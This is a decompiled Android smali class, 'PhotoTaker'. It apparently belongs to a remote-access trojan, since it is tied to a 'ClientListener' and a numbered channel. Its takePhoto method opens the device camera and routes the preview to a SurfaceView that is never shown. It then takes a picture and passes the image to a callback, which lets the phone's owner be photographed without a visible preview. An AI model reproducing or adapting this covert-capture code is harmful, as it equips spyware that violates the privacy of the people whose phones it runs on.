.class public Lmy/app/Library/PhotoTaker;
.super Ljava/lang/Object;
.source "PhotoTaker.java"


# instance fields
.field cam:Landroid/hardware/Camera;

.field chan:I

.field ctx:Lmy/app/client/ClientListener;

.field holder:Landroid/view/SurfaceHolder;

.field private pic:Landroid/hardware/Camera$PictureCallback;


# direct methods
.method public constructor <init>(Lmy/app/client/ClientListener;I)V
    .locals 1
    .parameter "c"
    .parameter "chan"

    .prologue
    .line 53
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 42
    new-instance v0, Lmy/app/Library/PhotoTaker$1;

    invoke-direct {v0, p0}, Lmy/app/Library/PhotoTaker$1;-><init>(Lmy/app/Library/PhotoTaker;)V

    iput-object v0, p0, Lmy/app/Library/PhotoTaker;->pic:Landroid/hardware/Camera$PictureCallback;

    .line 54
    iput p2, p0, Lmy/app/Library/PhotoTaker;->chan:I

    .line 55
    iput-object p1, p0, Lmy/app/Library/PhotoTaker;->ctx:Lmy/app/client/ClientListener;

    .line 56
    return-void
.end method


# virtual methods
.method public takePhoto()Z
    .locals 6

    .prologue
    const/4 v5, 0x0

    const/4 v2, 0x0

    .line 66
    iget-object v3, p0, Lmy/app/Library/PhotoTaker;->ctx:Lmy/app/client/ClientListener;

    invoke-virtual {v3}, Lmy/app/client/ClientListener;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    const-string v4, "android.hardware.camera"

    invoke-virtual {v3, v4}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_1

    .line 87
    :cond_0
    :goto_0
    return v2

    .line 68
    :cond_1
    const-string v3, "PhotoTaker"

    const-string v4, "Just before Open !"

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 70
    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v3

    iput-object v3, p0, Lmy/app/Library/PhotoTaker;->cam:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 73
    const-string v3, "PhotoTaker"

    const-string v4, "Right after Open !"

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 75
    iget-object v3, p0, Lmy/app/Library/PhotoTaker;->cam:Landroid/hardware/Camera;

    if-eqz v3, :cond_0

    .line 78
    new-instance v1, Landroid/view/SurfaceView;

    iget-object v3, p0, Lmy/app/Library/PhotoTaker;->ctx:Lmy/app/client/ClientListener;

    invoke-direct {v1, v3}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    .line 80
    .local v1, view:Landroid/view/SurfaceView;
    :try_start_1
    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v3

    iput-object v3, p0, Lmy/app/Library/PhotoTaker;->holder:Landroid/view/SurfaceHolder;

    .line 81
    iget-object v3, p0, Lmy/app/Library/PhotoTaker;->cam:Landroid/hardware/Camera;

    iget-object v4, p0, Lmy/app/Library/PhotoTaker;->holder:Landroid/view/SurfaceHolder;

    invoke-virtual {v3, v4}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 84
    iget-object v2, p0, Lmy/app/Library/PhotoTaker;->cam:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->startPreview()V

    .line 85
    iget-object v2, p0, Lmy/app/Library/PhotoTaker;->cam:Landroid/hardware/Camera;

    iget-object v3, p0, Lmy/app/Library/PhotoTaker;->pic:Landroid/hardware/Camera$PictureCallback;

    invoke-virtual {v2, v5, v5, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 87
    const/4 v2, 0x1

    goto :goto_0

    .line 71
    .end local v1           #view:Landroid/view/SurfaceView;
    :catch_0
    move-exception v0

    .local v0, e:Ljava/lang/Exception;
    goto :goto_0

    .line 82
    .end local v0           #e:Ljava/lang/Exception;
    .restart local v1       #view:Landroid/view/SurfaceView;
    :catch_1
    move-exception v0

    .local v0, e:Ljava/io/IOException;
    goto :goto_0
.end method
